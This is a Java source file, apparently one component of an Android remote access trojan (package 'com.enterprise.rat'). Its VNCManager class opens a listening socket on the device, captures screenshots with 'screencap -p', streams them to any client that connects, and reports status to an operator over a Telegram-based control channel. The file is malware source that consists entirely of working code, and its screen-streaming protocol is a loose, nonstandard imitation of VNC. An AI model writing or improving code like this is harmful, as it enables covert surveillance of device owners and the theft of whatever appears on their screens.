package com.enterprise.rat.commands;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import com.enterprise.rat.utils.TelegramApi;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;

public class VNCManager {
    private Context context;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private ServerSocket serverSocket;
    private boolean running = false;
    private HandlerThread handlerThread;
    private Handler handler;

    public VNCManager(Context context) { this.context = context; }

    public void startServer(int port) {
        if (running) { TelegramApi.sendMessage("⚠ VNC already active."); return; }
        handlerThread = new HandlerThread("VNCThread");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());

        new Thread(() -> {
            try {
                serverSocket = new ServerSocket(port);
                running = true;
                TelegramApi.sendMessage("🖥 VNC server started on port " + port + ". Connect via VNC viewer.");
                while (running) {
                    Socket client = serverSocket.accept();
                    new Thread(() -> handleVNCClient(client)).start();
                }
            } catch (IOException e) {
                TelegramApi.sendMessage("❌ VNC error: " + e.getMessage());
            }
        }).start();
    }

    private void handleVNCClient(Socket client) {
        try {
            OutputStream os = client.getOutputStream();
            InputStream is = client.getInputStream();
            // RFB handshake
            os.write("RFB 003.008\n".getBytes());
            os.flush();
            byte[] buffer = new byte[4096];
            while (running && client.isConnected()) {
                // Simplified: screenshot-based VNC
                Process p = Runtime.getRuntime().exec("screencap -p");
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                InputStream pis = p.getInputStream();
                byte[] data = new byte[4096];
                int n;
                while ((n = pis.read(data)) != -1) baos.write(data, 0, n);
                byte[] frame = baos.toByteArray();
                ByteBuffer header = ByteBuffer.allocate(16);
                header.put((byte) 0);
                header.put((byte) 0);
                header.putShort((short) 1);
                header.putInt(frame.length);
                os.write(header.array());
                os.write(frame);
                os.flush();
                Thread.sleep(500);
            }
            client.close();
        } catch (Exception e) {}
    }

    public void stopServer() {
        running = false;
        try { if (serverSocket != null) serverSocket.close(); } catch (Exception e) {}
        if (handlerThread != null) handlerThread.quitSafely();
        TelegramApi.sendMessage("🖥 VNC server stopped.");
    }
}
